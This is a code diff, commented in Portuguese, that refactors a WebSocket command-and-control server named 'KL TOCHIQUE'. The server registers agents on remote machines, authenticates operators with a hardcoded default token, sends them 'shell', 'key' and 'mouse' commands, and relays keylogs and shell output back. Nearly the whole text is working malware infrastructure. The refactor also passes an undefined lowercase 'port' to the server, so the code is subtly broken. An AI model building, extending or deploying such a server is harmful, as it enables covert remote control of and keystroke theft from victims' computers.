@@ -1,106 +1,140 @@
-const WebSocket = require('ws');
-const { v4: uuidv4 } = require('uuid');
+/**
+ * KL TOCHIQUE - C2 SERVER CORE (ESM VERSION)
+ * Versão: 1.1.0
+ * Compatível com: Railway / ES Modules
+ */
 
-// Configurações
-const PORT = 5000;
-const ADMIN_TOKEN = "SUA_CHAVE_MESTRA"; // Token para proteger o acesso do seu painel
+import WebSocket from 'ws';
+import { v4 as uuidv4 } from 'uuid';
 
-// Armazenamento em memória (Em produção, use Redis ou MongoDB)
-let agents = new Map(); // { agentId: { socket, info } }
-let admins = new Set(); // Conjunto de conexões de administradores
+// --- CONFIGURAÇÕES ---
+const PORT = process.env.PORT || 8080;
+const ADMIN_TOKEN = process.env.ADMIN_TOKEN || "KL_SECRET_TOKEN_2024";
 
-const wss = new WebSocket.Server({ port: PORT });
+// --- ESTADO DO SERVIDOR ---
+let agents = new Map(); 
+let admins = new Set(); 
 
-console.log(`[!] Servidor C2 iniciado na porta ${PORT}`);
-console.log(`[!] Aguardando conexões de Agentes e Admins...`);
+const wss = new WebSocket.Server({ port });
 
+console.log(`[🚀] KL TOCHIQUE SERVER INICIADO (ESM MODE)`);
+console.log(`[📡] Porta: ${PORT}`);
+console.log(`[🔑] Token Admin: ${ADMIN_TOKEN}`);
+console.log(`[🌐] Aguardando conexões...`);
+
+// --- EVENTO PRINCIPAL ---
 wss.on('connection', (ws, req) => {
-    let currentRole = null;
+    let currentRole = null; 
     let currentId = null;
+    let connectionTime = new Date();
+
+    // Log de debug para ajudar você a ver quem está conectando
+    console.log(`[DEBUG] Nova tentativa de conexão detectada!`);
 
     ws.on('message', async (message) => {
         try {
             const data = JSON.parse(message);
 
-            // --- LÓGICA PARA AGENTES ---
-            if (data.type === 'agent_ready') {
+            // 1. LÓGICA PARA AGENTES
+            if (data.type === 'agent_ready' || data.type === 'agent_hello') {
+                handleAgentConnection(ws, data);
                 currentRole = 'agent';
-                currentId = data.payload.id;
-                
-                agents.set(currentId, {
-                    socket: ws,
-                    info: {
-                        name: data.payload.name,
-                        user: data.payload.user,
-                        os: data.payload.os,
-                        connectedAt: new Date()
-                    }
-                });
+                currentId = data.id;
+            } 
 
-                console.log(`[+] Agente Conectado: ${data.payload.name} (${data.payload.user})`);
-                // Notifica todos os admins que um novo agente está online
-                broadcastToAdmins({ type: 'agent_online', agentId: currentId, info: data.payload });
-            }
-
-            // --- LÓGICA PARA ADMINISTRADORES (PAINEL WEB) ---
+            // 2. LÓGICA PARA ADMINISTRADORES (PAINEL WEB)
             else if (data.type === 'admin_login') {
                 if (data.token === ADMIN_TOKEN) {
                     currentRole = 'admin';
                     admins.add(ws);
-                    currentId = 'admin_main';
-                    console.log(`[!] Administrador conectado via Painel.`);
+                    console.log(`[✅] Admin Conectado: ${data.label || 'Operador'}`);
                     ws.send(JSON.stringify({ type: 'admin_auth_ok' }));
                 } else {
+                    console.log(`[❌] Tentativa de login falha com token inválido.`);
                     ws.send(JSON.stringify({ type: 'error', message: 'Token Inválido' }));
                     ws.close();
                 }
             }
 
-            // --- ROTEAMENTO DE COMANDOS (ADMIN -> AGENTE) ---
+            // 3. ROTEAMENTO DE COMANDOS (ADMIN -> AGENTE)
             else if (currentRole === 'admin' && data.type === 'command_request') {
-                const { agentId, command, params } = data;
-                const targetAgent = agents.get(agentId);
-
-                if (targetAgent) {
-                    // Envia o comando para o agente específico
-                    targetAgent.socket.send(JSON.stringify({
-                        type: command, // 'shell', 'key', 'mouse'
-                        ...params
-                    }));
-                    console.log(`[>] Comando enviado para Agente ${agentId}: ${command}`);
-                } else {
-                    ws.send(JSON.stringify({ type: 'error', message: 'Agente offline' }));
-                }
+                routeCommandToAgent(data);
             }
 
-            // --- ROTEAMENTO DE RESPOSTAS (AGENTE -> ADMIN) ---
+            // 4. ROTEAMENTO DE RESPOSTAS (AGENTE -> ADMIN)
             else if (currentRole === 'agent') {
-                // Repassa a resposta do agente (shell_result, keylog, etc) para todos os admins
-                broadcastToAdmins({
-                    type: data.type,
-                    agentId: currentId,
-                    payload: data.payload || data
-                });
+                routeResponseToAdmins(currentId, data);
             }
 
         } catch (err) {
-            console.error(`[!] Erro ao processar mensagem: ${err.message}`);
+            console.error(`[⚠️] Erro ao processar mensagem: ${err.message}`);
         }
     });
 
     ws.on('close', () => {
         if (currentRole === 'agent') {
             agents.delete(currentId);
-            console.log(`[-] Agente Desconectado: ${currentId}`);
+            console.log(`[[-] Agente Desconectado: ${currentId}`);
             broadcastToAdmins({ type: 'agent_offline', agentId: currentId });
         } else if (currentRole === 'admin') {
             admins.delete(ws);
-            console.log(`[-] Administrador Desconectado.`);
+            console.log(`[[-] Administrador Desconectado.`);
         }
+    });
+
+    ws.on('error', (err) => {
+        console.error(`[!] Erro no socket: ${err.message}`);
     });
 });
 
-// Funções de utilidade
+// --- FUNÇÕES DE SUPORTE ---
+
+function handleAgentConnection(ws, data) {
+    const agentId = data.id || uuidv4();
+    agents.set(agentId, {
+        socket: ws,
+        info: {
+            name: data.name || 'Unknown',
+            user: data.user || 'Unknown',
+            os: data.os || 'Unknown',
+            connectedAt: new Date()
+        }
+    });
+
+    console.log(`[+] Agente Registrado: ${data.name} (${data.user}) | ID: ${agentId}`);
+    
+    broadcastToAdmins({
+        type: 'agent_online',
+        agentId: agentId,
+        info: data.info || data
+    });
+}
+
+function routeCommandToAgent(data) {
+    const { agentId, command, params } = data;
+    const target = agents.get(agentId);
+
+    if (target && target.socket.readyState === WebSocket.OPEN) {
+        target.socket.send(JSON.stringify({
+            type: command,
+            ...params,
+            timestamp: new Date()
+        }));
+        console.log(`[>] Comando [${command}] enviado para Agente: ${agentId}`);
+    } else {
+        console.log(`[!] Erro: Agente ${agentId} não encontrado ou offline.`);
+    }
+}
+
+function routeResponseToAdmins(agentId, data) {
+    broadcastToAdmins({
+        type: data.type,
+        agentId: agentId,
+        payload: data.payload || data,
+        timestamp: new Date()
+    });
+}
+
 function broadcastToAdmins(msg) {
     const payload = JSON.stringify(msg);
     admins.forEach(adminWs => {
@@ -110,7 +144,17 @@ function broadcastToAdmins(msg) {
     });
 }
 
-// Prevenção de crash
+// --- MONITORAMENTO ---
+setInterval(() => {
+    if (agents.size > 0) {
+        console.log(`[📊] Status: ${agents.size} Agentes Online | ${admins.size} Admins Online`);
+    }
+}, 30000);
+
 process.on('uncaughtException', (err) => {
     console.error(`[CRITICAL] ${err.message}`);
+});
+
+process.on('unhandledRejection', (reason) => {
+    console.error(`[CRITICAL] Unhandled Rejection: ${reason}`);
 });
